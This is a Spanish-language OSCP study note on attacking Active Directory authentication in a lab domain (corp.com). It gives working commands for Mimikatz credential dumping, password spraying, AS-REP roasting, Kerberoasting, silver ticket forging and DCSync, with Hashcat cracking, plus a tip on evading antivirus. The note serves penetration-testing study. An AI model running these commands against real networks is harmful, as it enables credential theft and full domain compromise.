---
tipo: modulo
modulo: 23
estado: repasado
tags:
  - oscp
  - ad
  - explotacion
  - windows
  - linux
fecha: 2026-10-06
---

# 23 - Attacking Active Directory Authentication

> [!abstract] Resumen
> Atacar los mecanismos de **autenticación** de AD para obtener credenciales y acceso. Mismo dominio `corp.com` del módulo 22.
> - **23.1 Teoría**: **NTLM** (challenge-response, 7 pasos) vs **Kerberos** (tickets vía KDC, TGT/TGS, 6 pasos). Credenciales cacheadas en **LSASS** → **Mimikatz** (`sekurlsa::logonpasswords`, `sekurlsa::tickets`). Requiere **admin local/SYSTEM**.
> - **23.2 Ataques**:
>   - **Password spraying** (ojo lockout): LDAP/ADSI (`Spray-Passwords.ps1`), SMB (`crackmapexec`), Kerberos AS-REQ (`kerbrute`).
>   - **AS-REP Roasting**: usuarios con *"Do not require Kerberos preauth"* → pedir AS-REP y crackear offline (`impacket-GetNPUsers`, `Rubeus asreproast`, Hashcat **18200**).
>   - **Kerberoasting**: pedir TGS de cuentas con **SPN** y crackear (SPN password) (`Rubeus kerberoast`, `impacket-GetUserSPNs`, Hashcat **13100**).
>   - **Silver ticket**: con el **NTLM hash del SPN** + domain SID → forjar TGS arbitrario (`kerberos::golden` en Mimikatz) y acceder al servicio como cualquier usuario/grupo.
>   - **DCSync**: con derechos de replicación (Domain/Enterprise Admins) impersonar un DC y pedir cualquier hash (`lsadump::dcsync`, `impacket-secretsdump`).
> Idea clave del examen: cada ataque es independiente y sirve en distintas fases. AS-REP y Kerberoast dan hashes **crackeables offline** sin tocar cuentas (sin lockout). Silver ticket y DCSync requieren ya privilegio alto (hash del SPN / derechos de replicación).

## Conceptos clave
- **NTLM auth**: el cliente arranca contra el **application server**. Hash NTLM del password → el server manda un **nonce**, el cliente responde cifrándolo, el **DC** valida. Se usa al autenticar por **IP** o host no registrado en DNS AD.
- **Kerberos auth**: el cliente arranca contra el **KDC** (en el DC). **AS-REQ** (timestamp cifrado con hash del user) → **AS-REP** (session key + **TGT**, cifrado con hash de **krbtgt**). Para un recurso: **TGS-REQ** (+TGT) → **TGS-REP** (service ticket cifrado con hash de la **service account**) → **AP-REQ** al server.
- **TGT vs TGS**: TGT = "pase maestro" (pedir más tickets). TGS/service ticket = acceso a un servicio concreto. TGT válido 10h.
- **LSASS**: cachea hashes y tickets (SSO). Extraer requiere **SYSTEM/admin local** (de ahí que a menudo haga falta privesc local primero). **Mimikatz** lo lee; **LSA Protection** lo dificulta.
- **Account lockout**: `net accounts` → *Lockout threshold* / *observation window*. Spray con **pocos** intentos por ventana para no bloquear cuentas.
- **AS-REP Roasting**: si un user tiene *"Do not require Kerberos preauth"*, cualquiera pide su AS-REP y lo crackea offline. Hashcat **18200**.
- **Kerberoasting**: cualquier user autenticado puede pedir el TGS de un **SPN** (no se comprueba permiso al pedirlo). El TGS va cifrado con el hash de la service account → crackear. Hashcat **13100**. Cuentas de **máquina/gMSA/krbtgt** tienen passwords de 120 chars (incrackeables) → apunta a **user accounts**.
- **Silver ticket**: con el hash NTLM del SPN forjas un TGS **localmente** (sin tocar el KDC), con los grupos/permisos que quieras (PAC). Funciona porque la app rara vez hace **PAC validation**.
- **DCSync**: abusa de **DRS replication** (`IDL_DRSGetNCChanges`). El DC no comprueba si quien pide viene de otro DC, solo los **derechos de replicación** (Domain/Enterprise Admins). Permite sacar el hash de **cualquier** user, incl. Administrator y krbtgt.
- **Targeted roasting**: con **GenericWrite/GenericAll** sobre un user puedes activarle "no preauth" (targeted AS-REP) o ponerle un SPN (targeted Kerberoast) sin resetear su password. **Revertir** el cambio después.

> [!tip] Idea para el examen
> Modos Hashcat: **AS-REP = 18200**, **TGS-REP (Kerberoast) = 13100**, **NTLM = 1000**. AS-REP/Kerberoast = **offline, sin lockout**. Para spraying rápido y silencioso usa **kerbrute** (solo 2 frames UDP). `crackmapexec smb` marca **(Pwn3d!)** si el user es admin local → rapidísimo para ver dónde tienes acceso. Silver ticket y DCSync son de **fase tardía** (ya tienes hash del SPN o eres Domain Admin). Si `impacket` da *clock skew* → `ntpdate`+`faketime`. Encoding de los `.txt` de users en **ANSI** para kerbrute.

---

## 23.1 Teoría de autenticación

### NTLM (7 pasos)

El cliente calcula el hash NTLM, manda el **username**, recibe un **nonce**, lo cifra (response) y el **DC** valida cifrando el mismo nonce con el hash del user.

![[mod23-ntlm-auth.png]]

### Kerberos (6 pasos, vía KDC)

AS-REQ → AS-REP (session key + TGT) → TGS-REQ → TGS-REP (service ticket) → AP-REQ al application server. El TGT se cifra con el hash de **krbtgt**; el service ticket con el hash de la **service account**.

![[mod23-kerberos-auth.png]]

### Credenciales cacheadas (Mimikatz)
Ver nota → [[Mimikatz]]. Requiere **admin local** (p.ej. `jeff` en CLIENT75) + `privilege::debug`.
```powershell
xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75
# PowerShell como Administrador -> C:\Tools\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords        # NTLM/SHA1 (y plaintext si WDigest activo) de usuarios logueados
sekurlsa::tickets               # TGT y TGS cacheados en LSASS
```
> [!warning] Mimikatz standalone tiene firmas muy conocidas → ejecútalo desde memoria (inyector PS) o vuelca LSASS (Task Manager) y cárgalo en otra máquina. Ver [[15 - Antivirus Evasion]].

---

## 23.2 Ataques a la autenticación

### Password spraying
Primero mira la política para no bloquear cuentas:
```powershell
net accounts        # Lockout threshold / observation window
```
```powershell
# 1) LDAP/ADSI (low & slow) - Spray-Passwords.ps1 en CLIENT75
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```
```bash
# 2) SMB con crackmapexec (ruidoso; marca Pwn3d! si es admin local)
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
```powershell
# 3) Kerberos AS-REQ con kerbrute (rápido, 2 frames UDP; .txt en ANSI)
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
Ver nota → [[AD Password Spraying]].

### AS-REP Roasting
Ver nota → [[AS-REP Roasting]]. Usuarios con preauth deshabilitada.
```bash
# Linux
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
```powershell
# Windows
.\Rubeus.exe asreproast /nowrap
# identificar candidatos: Get-DomainUser -PreauthNotRequired (PowerView)
```

### Kerberoasting
Ver nota → [[Kerberoasting]]. Cuentas con SPN.
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Silver ticket
Ver nota → [[Silver Ticket]]. Necesitas: **hash NTLM del SPN** + **domain SID** + **target SPN**.
```powershell
whoami /user                    # domain SID (quitar el RID del final)
# en Mimikatz (admin local donde el SPN tiene sesión): sekurlsa::logonpasswords -> NTLM de iis_service
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
klist                           # confirmar el ticket inyectado
iwr -UseDefaultCredentials http://web04     # acceso como jeffadmin (sin su password!)
```

### DCSync
Ver nota → [[DCSync]]. Requiere derechos de replicación (Domain/Enterprise Admins).
```powershell
# Windows (Mimikatz, como jeffadmin / Domain Admin)
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
```
```bash
# Linux
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"Password\!"@192.168.50.70
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

---

## Comandos
```powershell
# Mimikatz (cached creds / tickets)
privilege::debug ; sekurlsa::logonpasswords ; sekurlsa::tickets

# Spraying
net accounts
.\Spray-Passwords.ps1 -Pass <pass> -Admin
.\kerbrute_windows_amd64.exe passwordspray -d <dominio> users.txt "<pass>"

# Roasting (Windows)
.\Rubeus.exe asreproast /nowrap
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Silver ticket / DCSync (Mimikatz)
kerberos::golden /sid:<domainSID> /domain:<d> /target:<host> /service:<svc> /rc4:<ntlm_spn> /user:<u> /ptt
lsadump::dcsync /user:corp\<u>
```
```bash
# Linux (impacket / crackmapexec / hashcat)
crackmapexec smb <ip> -u users.txt -p '<pass>' -d <dominio> --continue-on-success
impacket-GetNPUsers -dc-ip <dc> -request -outputfile asrep.txt <dominio>/<user>
impacket-GetUserSPNs -request -dc-ip <dc> <dominio>/<user>
impacket-secretsdump -just-dc-user <target> <dominio>/<admin>:'<pass>'@<dc>
hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule     # AS-REP
hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule       # Kerberoast
hashcat -m 1000  ntlm.txt rockyou.txt -r best64.rule      # NTLM (dcsync)
```
| Ataque | Requisito | Herramienta | Hashcat |
|---|---|---|---|
| AS-REP Roasting | user sin preauth | GetNPUsers / Rubeus asreproast | 18200 |
| Kerberoasting | user con SPN | GetUserSPNs / Rubeus kerberoast | 13100 |
| Silver ticket | hash NTLM del SPN + SID | Mimikatz `kerberos::golden` | — |
| DCSync | derechos de replicación | Mimikatz `dcsync` / secretsdump | 1000 (NTLM) |
| Spraying SMB | lista de users | crackmapexec | — |

> [!warning] Errores comunes / cosas que fallan
> - **Lockout**: comprueba `net accounts` antes de spray; crackmapexec **no** mira la política.
> - Mimikatz necesita **admin local/SYSTEM** + `privilege::debug`.
> - `impacket` *KRB_AP_ERR_SKEW (clock skew)* → `ntpdate <dc>` + `faketime`.
> - kerbrute: `usernames.txt` en **ANSI** o da error de red.
> - Silver ticket: cuentas de máquina/gMSA/krbtgt = passwords incrackeables (120 chars).
> - Targeted roasting (GenericWrite/All): **revierte** el cambio (quita SPN / preauth) al terminar.
> - Patch PAC_REQUESTOR (oct 2022): ya no puedes forjar tickets para users **inexistentes**.

## Ejemplo práctico
> [!example] Cadena de corp.com
> 1. Mimikatz en CLIENT75 (jeff admin local) → `sekurlsa::logonpasswords` saca NTLM de usuarios logueados.
> 2. Spraying (`kerbrute`/`crackmapexec`) con `Nexus123!` → valen `pete` y `jen`.
> 3. AS-REP roast (`pete`) → `dave` sin preauth → Hashcat 18200 → `Flowers1`.
> 4. Kerberoast → `iis_service` (SPN HTTP/web04) → Hashcat 13100 → `Strawberry1`.
> 5. Silver ticket con el NTLM de iis_service → acceso a http/web04 como `jeffadmin`.
> 6. Con `jeffadmin` (Domain Admin) → **DCSync** del `Administrator` → hash NTLM del dominio.

## Relacionado
- Técnicas: [[AS-REP Roasting]] · [[Kerberoasting]] · [[Silver Ticket]] · [[DCSync]] · [[AD Password Spraying]] · [[Mimikatz]] · [[Password Cracking (Hashcat y John)]]
- Cheatsheet: [[Active Directory]] · [[Password Attacks]]
- Módulo previo: [[22 - Active Directory Introduction and Enumeration]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Diferencia exacta **silver** vs **golden** ticket (golden = hash de krbtgt, se ve en el módulo de lateral movement).
> - `/tgtdeleg` vs `/ticket` en Rubeus para forzar RC4 en cuentas AES-enabled al kerberoastear.
> - Flujo completo de **targeted** AS-REP/Kerberoast vía GenericWrite paso a paso.
